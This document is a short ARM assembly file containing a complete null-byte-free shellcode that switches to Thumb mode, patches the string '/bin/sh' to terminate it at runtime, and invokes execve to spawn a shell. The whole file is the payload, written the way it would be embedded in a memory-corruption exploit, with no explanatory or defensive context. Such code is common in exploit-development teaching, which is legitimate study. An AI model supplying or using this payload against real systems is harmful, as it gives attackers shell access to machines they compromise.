.text
.global _start

_start:
	add r1, pc, #1
	bx r1

.code 16
	adr r0, _string
	eor r1, r1, r1
	eor r2, r2, r2
	strb r1, [r0, #7]
	mov r7, #11
	svc #1

_string:
.ascii  "/bin/shA"
